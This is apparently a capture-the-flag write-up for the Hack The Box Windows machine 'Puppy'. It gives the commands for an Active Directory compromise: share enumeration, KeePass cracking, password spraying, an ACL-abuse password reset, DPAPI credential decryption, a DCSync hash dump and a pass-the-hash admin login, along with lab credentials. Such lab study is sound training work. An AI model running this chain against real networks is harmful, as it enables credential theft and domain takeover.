---
title: "HTB Machine : Puppy"
description: Puppy is an easy Windows machine on HTB. Initial access is obtained by abusing weak credentials in an exposed service. User enumeration reveals credentials for a low-privileged account. Privilege escalation is performed via misconfigured service and local file access to obtain Administrator privileges.
image: /images/Puppy/Puppy.png
date: 2025-08-05 14:30:00 +/-TTTT
categories: [HTB]
tags: [HTB, Windows, AD, pentest]
---

## Overview

- **Initial Access**: Valid credentials
- **Privilege Escalation**: BloodHound + DPAPI + NTDS dump
- **Techniques**:
  - SMB enumeration
  - KeePass cracking
  - ACL abuse
  - Credential extraction
  - DC Sync attack

---

## Initial Credentials

Username: levi.james
Password: KingofAkron2025!

---

## Enumeration

### Nmap
```bash
nmap -sC -sV -oN puppy.nmap 10.10.11.70
# Nmap 7.95 scan initiated Sat May 24 12:37:04 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN puppy.nmap 10.10.11.70
Nmap scan report for 10.10.11.70
Host is up (0.050s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-24 17:37:38Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-24T17:39:31
|_  start_date: N/A
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 24 12:40:11 2025 -- 1 IP address (1 host up) scanned in 186.52 seconds
```

> add the domains to  `/etc/hosts` 

```bash
echo "10.10.11.70   DC DC.PUPPY.HTB PUPPY.HTB" | sudo tee -a /etc/hosts
```

## SMB Enumeration

### Shares via `nxc`

```bash
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares
```

**Interesting Share**: `\\puppy.htb\DEV`
**Downloaded**:

* `recovery.kdbx` â€“ KeePass DB
* `KeePassXC-2.7.9-Win64.msi`

---

## Cracking KeePass

### Tool: `keepass4brute`

```bash
keepass4brute.sh recovery.kdbx /opt/rockyou.txt 
```

> Password found: `liverpool`

### Extracted Credentials

```yml

| Username       | Password       |
| -------------- | -------------- |
| jamie.williams | JamieLove2025! |
| adam.silver    | HJKL2025!      |
| ant.edwards    | Antman2025!    |
| steve.tucker   | Steve2025!     |
| samuel.blake   | ILY2025!       |

```
---

## Valid Credential Spray

```bash
nxc smb puppy.htb -u users.txt -p passwords.txt | grep '[+]'
```

**Valid**: `PUPPY.HTB\ant.edwards:Antman2025!`

---

## BloodHound Enumeration

### Sync time & run

```bash
faketime "$(ntpdate -q 10.10.11.70 | awk '/^[0-9]/ { print $1" "$2; exit }')" \
bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb -ns 10.10.11.70 -c all --zip
```

> **Finding**: `SENIOR DEVS` group has `GenericAll` on `adam.silver`

![alt text](/images/Puppy/genall.png)
---

##  Reset Password via ACL Abuse

```bash
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password 'adam.silver' 'Passw@rd'
```

 New creds: `adam.silver / Passw@rd`

---

## WinRM Access

```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p 'Passw@rd'
```
> i got the user flag

---

## Discovery: Site Backup

* Found: `C:\Backups\site-backup-2024-12-30.zip`
* Extracted: `nms-auth-config.xml.bak`

```xml
<bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
<bind-password>ChefSteph2025!</bind-password>
```

---

## Pivot to steph.cooper

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'
```

Accessed `APPDATA\Roaming\Microsoft\Credentials`
Dumped masterkey + credential blob

---

## DPAPI Decryption

```bash
impacket-dpapi masterkey -file key.blob -sid <sid> -password 'ChefSteph2025!'
```

```bash
impacket-dpapi credential -file credentils.blob -key <decrypted_key>
```

Recovered:

```
Username: steph.cooper_adm
Password: FivethChipOnItsWay2025!
```

---

## Domain Privilege Escalation

### User has:

* DS-Replication-Get-Changes
* DS-Replication-Get-Changes-All

### DCSync via NTDS Dump

```bash
nxc smb 10.10.11.70 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds
```
![alt text](/images/Puppy/dcsync.png)
> Recovered Administrator hash:

```
bb0edc15e49ceb4120c7bd7e6e65d75b
```

---

## Final Pwn: Administrator Access

```bash
evil-winrm -i 10.10.11.70 -u administrator -H bb0edc15e49ceb4120c7bd7e6e65d75b
```

> we got the Root Flag

---

